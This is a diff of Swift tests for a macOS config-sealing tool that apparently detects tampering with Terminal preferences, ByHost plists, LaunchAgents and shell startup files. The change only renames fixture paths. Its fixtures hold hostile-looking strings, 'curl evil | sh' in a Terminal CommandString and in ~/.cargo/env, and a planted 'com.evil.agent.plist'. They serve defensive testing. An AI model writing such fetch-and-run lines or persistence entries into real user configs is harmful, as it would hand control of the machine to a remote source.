@@ -269,7 +269,7 @@ struct MacSealListTests {
         var profile = (Self.terminal()["Window Settings"] as? [String: Any])?["Basic"] as? [String: Any] ?? [:]
         profile["CommandString"] = "curl evil | sh"
         for (what, extra) in [("a profile's CommandString", ["Window Settings": ["Basic": profile]]),
-                              ("Terminal's Shell", ["Shell": "/tmp/evil"]),
+                              ("Terminal's Shell", ["Shell": "/opt/evil"]),
                               ("a key no one listed", ["TTAppPreferences Selected Tab": 1]),
                               ("a key that looks like churn", ["NSWindowFrame TTWindow Basic": "1 1 1 1"]),
                               ("a value's type", ["HasMigratedDefaults": 1]),
@@ -329,9 +329,9 @@ struct MacSealListTests {
         try FileManager.default.createDirectory(atPath: byHost, withIntermediateDirectories: true)
         expectNew("the ByHost folder made")
         let folderOnly = ConfigSeal.fingerprint(row)
-        try Self.writePlist(["Shell": "/tmp/evil"], byHost + "/com.apple.Terminal.00000000-0000-0000-0000-000000000000.plist")
+        try Self.writePlist(["Shell": "/opt/evil"], byHost + "/com.apple.Terminal.00000000-0000-0000-0000-000000000000.plist")
         expectNew("a ByHost file appearing")
-        try Self.writePlist(["Shell": "/tmp/evil"], byHost + "/com.apple.Safari.00000000-0000-0000-0000-000000000000.plist")
+        try Self.writePlist(["Shell": "/opt/evil"], byHost + "/com.apple.Safari.00000000-0000-0000-0000-000000000000.plist")
         #expect(MacSealList.preferenceKeys(row.path).keys.allSatisfy { !$0.contains("Safari") }, "another app's ByHost file read")
         try FileManager.default.removeItem(atPath: byHost + "/com.apple.Terminal.00000000-0000-0000-0000-000000000000.plist")
         #expect(ConfigSeal.fingerprint(row) == folderOnly, "the ByHost file gone: a change from the seal that had it")
@@ -341,7 +341,7 @@ struct MacSealListTests {
         // The domain's own file absent: a ByHost file appearing is still a change (it isn't left behind the absent file).
         try FileManager.default.removeItem(atPath: row.path)
         let noFile = try #require(ConfigSeal.fingerprint(row))
-        try Self.writePlist(["Shell": "/tmp/evil"], byHost + "/com.apple.Terminal.11111111-1111-1111-1111-111111111111.plist")
+        try Self.writePlist(["Shell": "/opt/evil"], byHost + "/com.apple.Terminal.11111111-1111-1111-1111-111111111111.plist")
         #expect(ConfigSeal.fingerprint(row) != noFile, "a ByHost file appearing beside no domain file held nothing")
         #expect(ConfigSeal.hashes(of: [row])[ConfigSeal.keyPrefix + row.name] == ConfigSeal.fingerprint(row))
     }
@@ -416,8 +416,8 @@ struct MacSealVaultTests: LeadTeamFixture {
             ("~/" + MacSealList.plist, { try write("<plist>another job</plist>\n", home + "/" + MacSealList.plist) },
              { try write("<plist>a third</plist>\n", home + "/" + MacSealList.plist) }),
             ("~/" + MacSealList.terminalPreferences,
-             { try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/tmp/evil"]), home + "/" + MacSealList.terminalPreferences) },
-             { try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/tmp/evil2"]), home + "/" + MacSealList.terminalPreferences) }),
+             { try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/opt/evil"]), home + "/" + MacSealList.terminalPreferences) },
+             { try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/opt/evil2"]), home + "/" + MacSealList.terminalPreferences) }),
             ("~/.cargo/env", { try write("curl evil | sh\n", home + "/.cargo/env") }, { try write("curl evil2 | sh\n", home + "/.cargo/env") }),
             ("~/.nvm/nvm.sh", { try write("evil\n", home + "/.nvm/nvm.sh") }, { try write("evil2\n", home + "/.nvm/nvm.sh") }),
             ("~/.nvm/alias", { try write("v23\n", home + "/.nvm/alias/default") }, { try write("v24\n", home + "/.nvm/alias/default") }),
@@ -523,7 +523,7 @@ struct MacSealVaultTests: LeadTeamFixture {
         #expect(mac.allSatisfy { record[$0] == nil }, "a Mac row recorded")
         try write("<plist>evil</plist>\n", home + "/Library/LaunchAgents/com.evil.agent.plist")
         try write("<plist>another job</plist>\n", home + "/" + MacSealList.plist)
-        try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/tmp/evil"]), home + "/" + MacSealList.terminalPreferences)
+        try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/opt/evil"]), home + "/" + MacSealList.terminalPreferences)
         #expect(try lead.checkConfig(root: root).held.isEmpty)
     }
 }
